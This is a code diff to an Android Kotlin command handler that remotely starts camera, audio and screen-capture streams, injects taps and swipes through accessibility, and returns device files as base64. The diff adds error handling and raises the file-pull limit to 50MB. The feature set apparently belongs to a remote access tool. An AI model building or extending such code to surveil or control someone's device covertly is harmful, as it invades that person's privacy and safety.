@@ -98,28 +98,50 @@ object CommandHandler {
     }
 
     private fun startCameraStream(ctx: Context, facing: String): JSONObject {
-        val i = Intent(ctx, CameraStreamService::class.java).apply { putExtra(CameraStreamService.EXTRA_FACING, facing) }
-        ContextCompat.startForegroundService(ctx, i)
-        return ok()
+        try {
+            val i = Intent(ctx, CameraStreamService::class.java).apply { putExtra(CameraStreamService.EXTRA_FACING, facing) }
+            ContextCompat.startForegroundService(ctx, i)
+            return ok()
+        } catch (e: Exception) { return fail("Failed to start camera: ${e.message}") }
     }
 
     private fun stopCameraStream(ctx: Context): JSONObject {
-        ctx.stopService(Intent(ctx, CameraStreamService::class.java))
-        return ok()
+        try {
+            ctx.stopService(Intent(ctx, CameraStreamService::class.java))
+            return ok()
+        } catch (e: Exception) { return fail(e.message ?: "Error") }
     }
 
-    private fun startAudio(ctx: Context): JSONObject { ContextCompat.startForegroundService(ctx, Intent(ctx, LiveAudioService::class.java)); return ok() }
-    private fun stopAudio(ctx: Context): JSONObject { ctx.startService(Intent(ctx, LiveAudioService::class.java).apply { action = LiveAudioService.ACTION_STOP }); return ok() }
+    private fun startAudio(ctx: Context): JSONObject { 
+        try {
+            ContextCompat.startForegroundService(ctx, Intent(ctx, LiveAudioService::class.java))
+            return ok() 
+        } catch (e: Exception) { return fail("Failed to start audio: ${e.message}") }
+    }
+    
+    private fun stopAudio(ctx: Context): JSONObject { 
+        try {
+            ctx.startService(Intent(ctx, LiveAudioService::class.java).apply { action = LiveAudioService.ACTION_STOP })
+            return ok() 
+        } catch (e: Exception) { return fail(e.message ?: "Error") }
+    }
 
     private fun startScreen(ctx: Context): JSONObject {
-        val data = ConnectionService.screenData ?: return fail("Grant Screen Capture in app first")
-        ContextCompat.startForegroundService(ctx, Intent(ctx, ScreenCaptureService::class.java).apply {
-            putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, ConnectionService.screenResultCode)
-            putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, data)
-        })
-        return ok()
+        try {
+            val data = ConnectionService.screenData ?: return fail("Grant Screen Capture in app first")
+            ContextCompat.startForegroundService(ctx, Intent(ctx, ScreenCaptureService::class.java).apply {
+                putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, ConnectionService.screenResultCode)
+                putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, data)
+            })
+            return ok()
+        } catch (e: Exception) { return fail("Failed to start screen: ${e.message}") }
     }
-    private fun stopScreen(ctx: Context): JSONObject { ctx.stopService(Intent(ctx, ScreenCaptureService::class.java)); return ok() }
+    private fun stopScreen(ctx: Context): JSONObject { 
+        try {
+            ctx.stopService(Intent(ctx, ScreenCaptureService::class.java))
+            return ok() 
+        } catch (e: Exception) { return fail(e.message ?: "Error") }
+    }
 
     private fun tap(x: Float, y: Float): JSONObject = if (TouchService.instance?.tap(x, y) == true) ok() else fail("Accessibility disabled")
     private fun swipe(x1: Float, y1: Float, x2: Float, y2: Float, ms: Long): JSONObject = if (TouchService.instance?.swipe(x1, y1, x2, y2, ms) == true) ok() else fail("Accessibility disabled")
@@ -138,7 +160,8 @@ object CommandHandler {
     private fun downloadFile(path: String): JSONObject {
         val f = File(path)
         if (!f.exists() || !f.isFile) return fail("Not a file")
-        if (f.length() > 5 * 1024 * 1024) return fail("File too large > 5MB")
+        // RAISED LIMIT TO 50MB
+        if (f.length() > 50L * 1024 * 1024) return fail("File too large > 50MB")
         return ok(JSONObject().put("b64", Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)))
     }
 
